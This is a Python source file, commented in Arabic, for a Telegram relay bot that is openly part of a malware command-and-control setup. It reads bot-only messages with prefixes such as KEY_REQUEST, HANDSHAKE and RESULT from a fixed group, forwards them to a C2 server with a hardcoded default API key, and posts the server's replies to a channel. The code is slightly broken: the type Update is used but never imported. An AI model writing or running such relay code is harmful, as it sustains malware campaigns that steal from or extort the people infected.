"""
C2 Telegram Relay Bot — وسيط فقط
================================
لا يستقبل أوامر من البشر ولا من الخاص.

• الداشبورد / السيرفر يبعتوا للشات عبر c2_server مباشرة (HTTP → Telegram API).
• هذا البوت يعمل polling لاستقبال رسائل الجروب من *بوتات فقط* (مثل بوت المالوير)،
  ثم يمرّر النص إلى c2_server (/internal/tg_message) ويبعت الرد على القناة لو مطلوب.
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import json
import requests
from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes

# ── Config ────────────────────────────────────────────────────────────
BASE_DIR        = os.path.dirname(os.path.abspath(__file__))
TELEGRAM_CONFIG = os.path.join(BASE_DIR, "telegram_config.json")
C2_URL          = os.environ.get("C2_SERVER_URL", "http://localhost:5000")
C2_KEY          = os.environ.get("C2_API_KEY", "c2_super_secret_key_2026_123456")
C2_HEADERS      = {"X-API-Key": C2_KEY, "Content-Type": "application/json"}

C2_GROUP_ID     = "-1002470378114"
C2_CHANNEL_ID   = "-1002426552780"
_C2_PREFIXES    = ("KEY_REQUEST:", "HANDSHAKE:", "RESULT:", "HEARTBEAT:")


def _load_token() -> str:
    try:
        if os.path.exists(TELEGRAM_CONFIG):
            with open(TELEGRAM_CONFIG, "r", encoding="utf-8") as f:
                cfg = json.load(f)
            token = cfg.get("token", "").strip()
            if token:
                print(f"✅ Token loaded from {TELEGRAM_CONFIG}")
                return token
    except Exception as e:
        print(f"⚠️  Could not load telegram_config.json: {e}")
    return os.environ.get("TELEGRAM_BOT_TOKEN", "")


async def handle_c2_group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسائل الجروب من بوتات فقط → C2 → رد على القناة إن وُجد."""
    if not update.message or not update.message.text:
        return
    if str(update.effective_chat.id) != C2_GROUP_ID:
        return

    user = update.effective_user
    if not user or not user.is_bot:
        # بشر أو رسائل بدون مرسل بوت — تجاهل بالكامل
        return

    text = update.message.text.strip()
    if not any(text.startswith(p) for p in _C2_PREFIXES):
        return

    try:
        r = requests.post(
            f"{C2_URL}/internal/tg_message",
            json={"text": text},
            headers=C2_HEADERS,
            timeout=10,
        )
        reply = r.json().get("reply")
        if reply:
            await context.bot.send_message(chat_id=int(C2_CHANNEL_ID), text=reply)
    except Exception as e:
        print(f"[C2 group handler] error: {e}")


async def error_handler(update, context):
    print(f"GLOBAL ERROR: {context.error}")


if __name__ == "__main__":
    TOKEN = _load_token()
    if not TOKEN:
        print("❌ No bot token found!")
        print("   Add the token via the Dashboard → Telegram page, then restart bot.py")
        sys.exit(1)

    app = (
        ApplicationBuilder()
        .token(TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .build()
    )

    app.add_handler(
        MessageHandler(
            filters.TEXT & filters.Chat(chat_id=int(C2_GROUP_ID)),
            handle_c2_group_message,
        )
    )
    app.add_error_handler(error_handler)

    print("🤖 C2 Relay Bot — bots-only group relay (no human commands)")
    print(f"   C2 Server: {C2_URL}")
    app.run_polling()
